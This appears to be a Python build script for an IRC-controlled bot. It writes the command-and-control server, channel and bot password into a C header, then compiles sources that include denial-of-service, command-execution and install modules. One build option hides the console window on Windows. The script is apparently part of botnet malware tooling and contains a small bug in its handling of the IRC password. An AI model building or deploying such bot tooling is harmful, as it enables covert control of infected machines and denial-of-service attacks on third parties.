#!/usr/bin/env python

#Imports:
import argparse
import sys
import os
import platform
from random import SystemRandom
from string import ascii_uppercase, digits

D = 8

#Adding commmand line options:
if 8==D:
	defName = ''.join(SystemRandom().choice(ascii_uppercase+digits) for _ in range(6)) #Random uppercase 6 character name.

parser = argparse.ArgumentParser(description="Script to compile bot code.")

parser.add_argument("-s","--server",help="IRC server to connect to.", default="irc.freenode.net")
parser.add_argument("-r","--port",help="IRC server port.", default="6667")
parser.add_argument("-w","--ircpassword",help="IRC server password.", default=None)
parser.add_argument("-c","--channel",help="Channel to join after connecting.", default="#nullbyte")
parser.add_argument("-p","--password",help="Bot password.", default="test123")
parser.add_argument("--windowed",help="Show console when running program", default=False, action='store_true')
parser.add_argument("-v","--verbosity",help="Increase verbosity.", default=False, action='store_true')

args = parser.parse_args()

#Print parsed options if verbosity is increased.
if args.verbosity:
	for arg in vars(args):
		print(arg+" = "+str(getattr(args, arg)))
		
#Open the file and read it.
with open("./temp.h","w") as modifiedfile:
	with open("./bot.h","r") as headerfile: #You can use with to have a file close after you are done doing actions on it
		while True:
			line = headerfile.readline() #Read a line from bot.h
			if not line: break #Stops reading/writing when end of bot.h is reached
			if "#define SERVER" in line:
				if args.verbosity:
					print("Changed server")
				modifiedfile.write("#define SERVER\t"+'"'+args.server+'"\n')
			elif "#define PORT" in line:
				if args.verbosity:
					print("Changed port")
				modifiedfile.write("#define PORT\t"+'"'+args.port+'"'+"\n")
			elif "#define CHANNEL" in line:
				if args.verbosity:
					print("Changed channel")
				modifiedfile.write("#define CHANNEL\t"+'"'+args.channel+'"\n')
			elif "#define BOT_PWORD" in line:
				if args.verbosity:
					print("Changed password")
				modifiedfile.write("#define BOT_PWORD\t"+'"'+args.password+'"\n')
			elif "#define IRC_PWORD" in line and args.ircpassword:
				modifiedfile.write("#define IRC_PWORD\t"+args.IRC_PWORD+"\n")
			else: #Just write the line if it's not supposed to be modified
				modifiedfile.write(line)

if platform.system() == "Windows":
	os.system("move temp.h bot.h")
	if args.windowed:
		os.system("gcc -Wall -Werror -O -o bot bot.c init.c recv.c exec.c dos.c install.c -lws2_32")
	else:
		os.system("gcc -Wall -Werror -O -mwindows -o bot bot.c init.c recv.c exec.c dos.c install.c -lws2_32")
else:
	os.system("mv temp.h bot.h")
	os.system("gcc -Wall -Werror -O -o bot *.c -lpthread")
print("Done")
